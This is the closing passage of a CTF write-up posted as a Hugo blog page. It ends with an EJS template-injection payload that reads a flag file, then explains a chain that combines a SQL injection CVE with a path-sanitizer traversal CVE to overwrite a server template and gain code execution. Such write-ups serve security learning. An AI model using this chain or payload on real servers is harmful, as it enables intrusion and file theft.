+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;content&#34;</span>: <span style="color:#e6db74">&#34;&lt;% const fs=process.mainModule.require(&#39;fs&#39;), p=process.mainModule.require(&#39;path&#39;); const dir=&#39;/tmp&#39;; const f=fs.readdirSync(dir).find(n=&gt;/^flag_[0-9a-f]+\\\\.txt$/.test(n)); const out=f?fs.readFileSync(p.join(dir,f),&#39;utf8&#39;):&#39;no-flag&#39;; %&gt;&lt;pre&gt;&lt;%- out %&gt;&lt;/pre&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>What the payload does:
+<ul>
+<li>Users.update(&hellip; where: { id: 2 }) stores the attachment value on the row with id = 2 (user leet).</li>
+<li>The findOne query uses a literal with replacements and the provided updatedat. Because of CVE-2023-25813 the :updatedat replacement is injected into the combined WHERE clause and the supplied &ldquo;OR id=2 OR&rdquo; fragment alters the boolean logic, causing the query to return the id=2 row (even though leet.verify is false).</li>
+<li>The code then computes file = /tmp/user/files/${psanitize(user.attachment)} and writes data.content into that path. Because the attachment value contains the ..=%5c&hellip; traversal payload and <a href="mailto:path-sanitizer@2.0.0">path-sanitizer@2.0.0</a> is vulnerable (CVE-2024-56198), the sanitized result resolves to /tmp/view/index.ejs and the attacker content is written into the template file.</li>
+<li>The app later renders /tmp/view/index.ejs with ejs.render(&hellip;). Because the attacker wrote EJS code into that file, the template runs on the server. The injected EJS reads /tmp/flag_<!-- raw HTML omitted -->.txt and prints it into the response (&hellip;flag..).</li>
+<li>Result: Remote Code Execution (template execution) and immediate disclosure of the flag (contents of the randomly named flag file) to the attacker.
+<img src="../image5.png" alt="alt text"></li>
+</ul>
+</li>
+</ul>
+<h3 id="flag-flagbug_">Flag: <strong>FLAG{Bug_C4ins_Br1ng5_Th3_B3st_Imp4ct}</strong></h3>
+</section>
+
+  
+  
+
+  
+  
+  
+  
+  <nav
+    class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg !leading-[1.2] *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"
+  >
+    
+    
+    <a class="ltr:ml-auto rtl:mr-auto justify-end pl-3" href="http://localhost:1313/posts/post-2/svn/"
+      ><span>Just use Dirsearch to get Critical Bug</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a
+    >
+    
+  </nav>
+  
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+</article>
+
+
+    </main>
+
+    <footer
+  class="mx-auto flex h-[4.5rem] max-w-[--w] items-center px-8 text-xs uppercase tracking-wider opacity-60"
+>
+  <div class="mr-auto">
+  
+    &copy; 2025
+    <a class="link" href="http://localhost:1313/">Blog of MaxNTV(aka vu.nguyen)</a>
+  
+  </div>
+  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
+    >powered by hugo️️</a
+  >️
+  <a
+    class="link"
+    href="https://github.com/nanxiaobei/hugo-paper"
+    rel="noopener"
+    target="_blank"
+    >hugo-paper</a
+  >
+</footer>
+
+  </body>
+</html>
